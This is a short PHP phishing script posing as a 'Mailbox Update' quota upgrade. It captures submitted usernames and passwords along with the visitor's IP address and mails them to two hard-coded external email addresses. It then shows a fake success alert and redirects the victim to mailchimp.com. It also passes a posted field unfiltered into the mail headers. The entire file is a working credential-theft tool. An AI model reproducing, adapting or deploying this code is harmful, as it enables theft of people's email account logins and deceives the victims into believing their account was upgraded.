<?

$adddate = date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$message .= "--------------new Gm lOgzzz ReZulT-----------------------\n";
$message .= "Usr ID            : ".$_POST['user']."\n";
$message .= "PWRD            : ".$_POST['pass']."\n";
$message .= "-----------------------------------------------------\n";
$message .= "IP Address         : $ip\n";
$message .= "Date & Time         : $adddate\n";
$message .= "---------------Created BY Great Wall------------------------------\n";
$recipient = "hussein.hassann53@hotmail.com,josu.bettan@gmail.com";
$subject = "|Mailbox Update|$pmal |$paf ";
$headers = "From: Mailbox Update <mmmm@servern.com>";
$headers .= $_POST['ZMailXdd']."\n";
if (mail($recipient,$subject,$message, $headers))
	   {
		   header("");
}
?>
<html><head>
<meta http-equiv="content-type" content="text/html; charset=windows-1252"><script language="javascript">
alert('Account Upgrade Is Successful.  1GB Mailbox Quota Has Been Added.');
window.location='http://mailchimp.com/';
</script></head></html>